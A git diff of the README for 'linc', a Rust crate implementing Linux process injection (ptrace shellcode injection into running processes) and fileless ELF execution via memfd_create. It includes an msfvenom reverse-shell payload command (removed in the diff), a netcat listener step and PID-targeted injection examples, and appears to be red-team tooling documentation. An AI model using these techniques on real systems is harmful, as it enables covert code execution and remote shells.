@@ -1,10 +1,19 @@
 # LINC - Linux INjection Crate
-`linc` is a Rust crate containing implementations for process injection and fileless ELF execution techniques on Linux.
+`linc` is a Rust crate containing implementations for process injection and fileless ELF execution techniques on Linux, supporting both 64-bit shellcode and ELF executables.
 
 ## Functionality
-The following techniques are currently implemented:
+`linc`'s functionality is divided into two sets of techniques:
+- `linc::inject`: Techniques that manipulate an existing process to execute injected payload.
+- `linc::spawn`: Techniques that create a new process to execute a payload.
+
+Currently implemented techniques:
+
+### Spawn
 - Using [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) to create an anonymous file in memory, write an ELF to it, and then execute.
 - Using [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html) to stop a forked process, overwrite its RIP register with shellcode, and then resume it.
+
+### Inject
+- Using [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html) to inject shellcode into an existing process by overwriting its RIP register.
 
 ## Usage
 Add `linc` as a dependency to your Rust project
@@ -12,13 +21,13 @@ Add `linc` as a dependency to your Rust project
 cargo add --git https://github.com/dustyw0lf/linc.git
 ```
 
-Add `linc` with the `http` to enable payload downloads via HTTP/S
+Add `linc` with the feature `http` to enable payload downloads via HTTP/S
 ```bash
 cargo add --git https://github.com/dustyw0lf/linc.git --features http
 ```
 
 ## Features
-`linc` has the following features, enabled by default:
+`linc` has the following features, not enabled by default:
 - `http`: Adds functionality to download payloads over HTTP/S.
 
 ## Examples
@@ -32,31 +41,33 @@ Change directory into `linc`
 cd linc
 ```
 
-### memfd
-Run the memfd example with an ELF file
-```bash
-cargo run --example memfd_executable
+Examples are named like so
+```unknown
+[technique type]_[name]_[payload type]
 ```
 
-Run the memfd example with the provided shellcode or use your own:
+and some of them may require additional setup, like setting a Netcat listener.
+
+### spawn_memfd_executable
+Run the spawn_memfd_executable example with an ELF file
 ```bash
-msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
+cargo run --example spawn_memfd_executable
 ```
 
+### inject_hollow_shellcode
 Start a listener
 ```bash
 nc -lvnp 1234
 ```
 
-Run the example
+Find a process' ID or create a process for testing
 ```bash
-cargo run --example memfd_shellcode
+sleep 10 &
 ```
 
-### hollow
-Run the hollow example with shellcode
+Run the example and pass the PID as an argument
 ```bash
-cargo run --example hollow_shellcode
+cargo run --example inject_hollow_shellcode -- <pid>
 ```
 
 ## Testing
@@ -72,3 +83,7 @@ cargo doc --no-deps
 ```
 
 The documentation will be in `target/doc/linc/index.html`.
+
+## Acknowledgments
+- Series of [blogposts](https://blog.f0b.org) on Linux process injection by Philippe Grégoire.
+- [The Definitive Guide to Linux Process Injection](https://www.akamai.com/blog/security-research/the-definitive-guide-to-linux-process-injection) by Ori David.
